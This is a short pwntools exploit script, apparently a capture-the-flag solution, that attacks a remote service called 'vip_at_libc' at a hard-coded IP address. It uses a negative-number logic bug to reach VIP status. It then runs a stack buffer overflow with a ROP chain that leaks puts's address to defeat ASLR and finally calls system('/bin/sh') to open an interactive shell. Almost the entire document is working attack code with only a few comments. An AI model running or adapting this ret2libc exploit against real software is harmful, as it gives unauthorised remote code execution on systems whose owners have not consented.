from pwn import *

context.binary = elf = ELF('./vip_at_libc')
libc = ELF('./libc.so.6', checksec=False)
rop_elf = ROP(elf)

#io = process('./vip_at_libc', env={"LD_PRELOAD":"./libc.so.6"})
#io = gdb.debug('./vip_at_libc', env={"LD_PRELOAD":"./libc.so.6"})
io = remote("51.254.39.184", 1335)

padding = b"A"*24

# The first attack is a logic bug to become VIP
def become_vip(io):
    io.sendlineafter(b"username: ", b"player", timeout=1)
    io.sendlineafter(b"> ", b"2", timeout=1)
    io.sendlineafter(b"> ", b"1", timeout=1)
    io.sendlineafter(b"> ", b"-100000", timeout=1)
    io.sendlineafter(b"> ", b"3", timeout=1)
    io.sendlineafter(b"> ", b"1", timeout=1)

become_vip(io) # We are now VIP Supreme Ultra

# The second attack is a buffer overflow, we'll do a simple ret2libc
payload = padding + flat(rop_elf.find_gadget(['ret'])[0],rop_elf.find_gadget(['pop rdi', 'ret'])[0])
payload += flat(elf.got["puts"],elf.plt["puts"],elf.symbols["_start"])

# First we leak puts()'s address
io.sendlineafter(b"> ", b"4", timeout=1)
io.sendlineafter(b"> ", payload, timeout=1)
io.recvuntil(b" whenever you want.\n\n\n")
leak = u64(io.recvline().rstrip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]

become_vip(io)

io.sendlineafter(b"> ", b"4", timeout=1)

# Now we call system("/bin/sh")
payload = padding + p64(rop_elf.find_gadget(['ret'])[0]) + p64(rop_elf.find_gadget(['pop rdi', 'ret'])[0])
payload += flat(next(libc.search(b"/bin/sh\x00")),libc.symbols["system"], libc.sym['exit'])

io.sendlineafter(b"> ", payload, timeout=1)

io.interactive()
